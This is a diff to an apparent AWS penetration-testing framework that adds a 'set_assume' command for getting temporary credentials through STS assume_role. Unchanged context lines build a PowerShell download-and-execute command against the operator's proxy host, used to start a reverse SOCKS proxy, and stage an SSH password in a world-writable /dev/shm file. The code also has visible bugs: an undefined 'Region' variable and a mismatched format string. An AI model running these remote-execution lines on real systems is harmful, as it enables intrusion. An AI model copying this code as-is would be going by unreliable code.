@@ -38,7 +38,7 @@ except ModuleNotFoundError as error:
 class Main:
     COMMANDS = [
         'data', 'exec', 'exit', 'help', 'list', 'ls', 'proxy', 'quit',
-        'regions', 'run', 'search', 'services', 'set_keys', 'set_regions',
+        'regions', 'run', 'search', 'services', 'set_keys','set_assume', 'set_regions',
         'swap_keys', 'update_regions', 'whoami'
     ]
 
@@ -513,6 +513,8 @@ class Main:
             self.print_all_service_data(command)
         elif command[0] == 'set_keys':
             self.set_keys()
+        elif command[0] == 'set_assume':
+            self.set_assume()
         elif command[0] == 'set_regions':
             self.parse_set_regions_command(command)
         elif command[0] == 'swap_keys':
@@ -605,7 +607,7 @@ class Main:
         proxy_ssh_username = proxy_settings.ssh_username
         proxy_ssh_password = proxy_settings.ssh_password
         proxy_target_agent = copy.deepcopy(proxy_settings.target_agent)
-        
+
 
         if len(command) == 1 or (len(command) == 2 and command[1] == 'help'):  # Display proxy help
             self.display_proxy_help()
@@ -771,10 +773,10 @@ class Main:
 
                             # Download the script from the PacuProxy server
                             downloaded_string = "(New-Object System.Net.WebClient).DownloadString('http://{}:5051/{}')".format(proxy_ip, secret_string)
-                            
+
                             # Run Invoke-Expression on the downloaded script to import it to memory
                             invoke_expression = 'powershell iex({})'.format(downloaded_string)
-                            
+
                             # Execute the newly imported script to start the reverse proxy
                             start_proxy_cmd = 'Start-SocksProxy -sshhost {} -username {} -password {} -RemotePort 8001 -LocalPort 5050'.format(proxy_ip, proxy_ssh_username, proxy_ssh_password)
 
@@ -783,13 +785,13 @@ class Main:
                         else:
                             if shm_name == '':
                                 shm_name = ''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase + string.digits, k=5))
-                            
+
                             # Create an in-memory file in /dev/shm that contains the password
                             create_shm = 'echo "echo {}" > /dev/shm/{}'.format(shm_name)
-                            
+
                             # Give the file 777 permissions
                             add_permissions = 'chmod 777 /dev/shm/{}'.format(shm_name)
-                            
+
                             # DISPLAY=dummy to emulate a display
                             # SSH_ASKPASS=/dev/shm/{} to tell SSH that the file will echo it a password
                             # setsid to avoid any prompts
@@ -862,8 +864,10 @@ class Main:
             run/exec <module name>              Execute a module
             set_keys                            Add a set of AWS keys to the session and set them as the
                                                   default
+            set_assume                          Set an assume role identity
             swap_keys                           Change the currently active AWS key to another key that has
                                                   previously been set for this session
+
             exit/quit                           Exit Pacu
 
         [ADVANCED] PacuProxy command info:
@@ -1081,6 +1085,8 @@ class Main:
             print('\n    run/exec <module name>\n        Execute a module\n')
         elif command_name == 'set_keys':
             print('\n    set_keys\n        Add a set of AWS keys to the session and set them as the default\n')
+        elif command_name == 'set_assume':
+            print('\n     set_assume\n     Switch to assume_role and temporary credentials')
         elif command_name == 'swap_keys':
             print('\n    swap_keys\n        Change the currently active AWS key to another key that has previously been set for this session\n')
         elif command_name == 'exit' or command_name == 'quit':
@@ -1261,6 +1267,104 @@ class Main:
 
         if key_alias is None:
             self.print('Configuration variables have been set.\n')
+
+    def set_assume(self, key_alias=None, access_key_id=None, secret_access_key=None, session_token=None, RoleArn=None, RoleSessionName=None, SerialNumber=None, TokenCode=None):
+        session = self.get_active_session()
+
+        # If key_alias is None, then it's being run normally from the command line (set_keys),
+        # otherwise it means it is set programmatically and we don't want any prompts if it is
+        # done programatically
+        if key_alias is None:
+            self.print('Setting Temporary Assume role Keys. Press enter to keep the value currently stored. Enter the letter C to clear the value, rather than set it. If you enter an existing key_alias, that key\'s fields will be updated with the information provided.')
+
+        # Key alias
+        if key_alias is None:
+            new_value = self.input(f'Key alias [{session.key_alias}]: ')
+        else:
+            new_value = key_alias
+            self.print(f'Key alias [{session.key_alias}]: {new_value}', output='file')
+        if str(new_value.strip().lower()) == 'c':
+            session.key_alias = None
+        elif str(new_value) != '':
+            session.key_alias = new_value
+
+        # Access Role
+        if key_alias is None:
+            new_value = self.input(f'Role ARN [{session.role}]: ')
+        else:
+            new_value = RoleArn
+            self.print(f'Role ARN [{session.role}]: {new_value}', output='file')
+        if str(new_value.strip().lower()) == 'c':
+            session.role = None
+        elif str(new_value) != '':
+            session.role = new_value
+
+        # Region
+        if key_alias is None:
+            new_value = self.input(f'Region [{session.region}]: ')
+        else:
+            new_value = Region
+            self.print(f'Region [{session.region}]: {new_value}', output='file')
+        if str(new_value.strip().lower()) == 'c':
+            session.region = None
+        elif str(new_value) != '':
+            session.region = new_value
+
+        # MFA Serial
+        if key_alias is None:
+            new_value = self.input(f'MFA Serial [{session.serial}]: ')
+        else:
+            new_value = SerialNumber
+            self.print(f'MFA Serial [{session.serial}]: {new_value}', output='file')
+        if str(new_value.strip().lower()) == 'c':
+            session.serial = None
+        elif str(new_value) != '':
+            session.serial = new_value
+
+        # MFA Token
+        if key_alias is None:
+            new_value = self.input(f'MFA token [{session.otp}]: ')
+        else:
+            new_value = TokenCode
+            self.print(f'MFA Token [{session.otp}]: {new_value}', output='file')
+        if str(new_value.strip().lower()) == 'c':
+            session.otp = None
+        elif str(new_value) != '':
+            session.otp = new_value
+
+        client = boto3.client('sts',region_name=session.region)
+        response = client.assume_role(
+        RoleArn=session.role,
+        RoleSessionName=session.key_alias,
+        SerialNumber=session.serial,
+        TokenCode=session.otp,
+        DurationSeconds=3600)
+
+        session.access_key_id=(response['Credentials']['AccessKeyId'])
+        session.secret_access_key=(response['Credentials']['SecretAccessKey'])
+        session.session_token=(response['Credentials']['SessionToken'])
+
+        aws_key = session.get_active_aws_key(self.database)
+        if aws_key:
+            aws_key.key_alias = session.key_alias
+            aws_key.access_key_id = session.access_key_id
+            aws_key.secret_access_key = session.secret_access_key
+            aws_key.session_token = session.session_token
+        else:
+            aws_key = AWSKey(
+                session=session,
+                key_alias=session.key_alias,
+                access_key_id=session.access_key_id,
+                secret_access_key=session.secret_access_key,
+                session_token=session.session_token
+            )
+        self.database.add(aws_key)
+        self.database.add(session)
+        self.database.commit()
+
+        if key_alias is None:
+            self.print('Configuration variables have been set.\n')
+
 
     def swap_keys(self):
         session = self.get_active_session()
